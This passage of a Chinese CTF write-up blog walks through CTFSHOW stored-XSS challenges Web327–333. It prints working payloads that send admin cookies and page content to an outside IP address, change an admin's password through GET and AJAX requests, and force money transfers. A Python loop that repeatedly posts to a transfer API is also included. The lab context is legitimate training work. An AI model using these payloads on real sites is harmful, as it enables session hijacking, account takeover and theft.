class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">  <span class="keyword">if</span> z ==<span class="number">2</span>:</span><br><span class="line">    z=<span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span> z ==<span class="number">0</span>:</span><br><span class="line">    res+=<span class="string">r&quot;\x&quot;</span></span><br><span class="line">  res += i</span><br><span class="line">  z+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="Web327（储存型XSS）"><a href="#Web327（储存型XSS）" class="headerlink" title="Web327（储存型XSS）"></a>Web327（储存型XSS）</h2><p>payload和最开始一题的是一样的啊，这题没有得到很好的体现</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003155828774.png" alt="image-20221003155828774"></p>
+<p>这边是要我们给admin发一封邮件，所以收件人是admin，然后信的内容就是我们的代码了，储存箱XSS和反射性XSS的差别就是持久性，储存箱XSS只要你注入了，每次访问都会返回信息，这一题payload虽然一样但是是通过邮件的方式储存在了那里</p>
+<h2 id="Web328"><a href="#Web328" class="headerlink" title="Web328"></a>Web328</h2><p>先上payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://43.140.251.169/X.php?1=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这一题也是储存型XSS：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003163505888.png" alt="image-20221003163505888"></p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003163512101.png" alt="image-20221003163512101"></p>
+<p>有用户注册和用户管理界面，用户管理界面，管理员端肯定能看到我们的信息，所以我们输入的用户名和密码就是XSS注入点了，我们把上面的payload当成用户名注册一下，然后在我们的后台就可以看到管理员的cookie：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003163607942.png" alt="image-20221003163607942"></p>
+<p>把这个cookie给自己的浏览器装上，再访问用户管理界面就会自动跳转：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003163641684.png" alt="image-20221003163641684"></p>
+<p>我们看不到后台数据，因为访问的一瞬间就跳转过去了，所以我们需要抓包来看：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003163704900.png" alt="image-20221003163704900"></p>
+<p>一个个放包后就看见了flag</p>
+<h2 id="Web329"><a href="#Web329" class="headerlink" title="Web329"></a>Web329</h2><p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003170654086.png" alt="image-20221003170654086"></p>
+<p>和上一题一样，也是这个注册界面，但是用上一题的方法拿到cookie后会发现，你并不能以管理员身份登入，那我们就换种方式就好了，我们拿不到cookie就拿想要的内容，payload如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index,value</span>)&#123;<span class="keyword">if</span>(value.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://43.140.251.169/X.php?1=&#x27;</span>+value.<span class="property">innerHTML</span>;&#125;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段js的意思就是从当前界面找到有ctfshow{的字段</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003171843168.png" alt="image-20221003171843168"></p>
+<h2 id="Web330"><a href="#Web330" class="headerlink" title="Web330"></a>Web330</h2><p>用上一题的payload不行，应该管理员所在界面并没有flag，这一题多了一个修改密码选项，说明我们可以用XSS修改管理员密码，先抓包：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003230902921.png" alt="image-20221003230902921"></p>
+<p>这是修改密码的抓包界面，地址是URL&#x2F;api&#x2F;change.php参数是p，我们制作payload：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>管理员搭建的靶场，本地肯定是127.0.0.1然后再登入管理员账号，密码是123，这样就拿到flag了，机会只有一次，假如之前输入了上一题的答案就会被污染</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221003234324251.png" alt="image-20221003234324251"></p>
+<p>这边可能是靶机有延迟吧，进去后手速要快，之后就会跳转了</p>
+<h2 id="Web331"><a href="#Web331" class="headerlink" title="Web331"></a>Web331</h2><p>这题修改密码的方式改为了post，我们用jquery中的ajax，不会写直接抄了QWQ</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="number">123</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输入完后也是可以修改管理员密码,上一题的页面也是这样</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221004000052654.png" alt="image-20221004000052654"></p>
+<h2 id="Web332"><a href="#Web332" class="headerlink" title="Web332"></a>Web332</h2><p>这题就是一个逻辑漏洞了，首先我可以给自己赚钱，并且自己的钱不会减少只会增加：（一开始是5元）</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221004000521163.png" alt="image-20221004000521163"></p>
+<p>我给自己赚钱-10000我就可以得到10000，这其实也不算啥xss了</p>
+<p>——————-warning———————–</p>
+<p>以上的方法已经被修复了！这一题我们使用预期解</p>
+<p>首先我们抓一下转账的包：</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221004000755671.png" alt="image-20221004000755671"></p>
+<p>可以发现接口是&#x2F;api&#x2F;amount.php，利用这个让管理员给我们转账10000元</p>
+<p>构造payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;/api/amount.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">u</span>:<span class="string">&#x27;boogipop&#x27;</span>,<span class="attr">a</span>:<span class="number">10000</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221004001307040.png" alt="image-20221004001307040"></p>
+<p>其实或者，用burp直接爆破1w次貌似也可以</p>
+<h2 id="Web333-XSS结束）"><a href="#Web333-XSS结束）" class="headerlink" title="Web333(XSS结束）"></a>Web333(XSS结束）</h2><p>和上一题思路差不多，也是转账</p>
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221004001409404.png" alt="image-20221004001409404"></p>
+<p>和上一题一样，让管理员给我们转账就好了，payload同上</p>
+<p>或者这次我们写个python脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Author:@Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;cookie&#x27;</span>:<span class="string">&#x27;PHPSESSID=4f3o5emvovrmbfha8b0ee06bvm&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;boogipop&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>:<span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&#x27;http://f6d876b7-0f8d-4deb-9431-bdc17d253e28.challenge.ctf.show/api/amount.php&#x27;</span></span><br><span class="line">x=<span class="number">4</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;boogipop&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: x</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url,data=data,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> x&gt;<span class="number">10000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-------done------&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:   </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not enough&#x27;</span>)</span><br><span class="line">    x+=x</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://boogipop-1314143616.cos.ap-beijing.myqcloud.com/image-20221004002807186.png" alt="image-20221004002807186"></p>
+<p>怒刷金币</p>
+<p>就告一段落啦大家SSTI再见~</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/CTFSHOW/" class="tag">#CTFSHOW</a><a href="/tags/RCE/" class="tag">#RCE</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/02/%E6%90%AD%E5%BB%BACTFd%E9%9D%B6%E5%9C%BA/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">搭建CTFd靶场</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/02/CTFSHOW-SSTI/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">CTFSHOW-SSTI</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
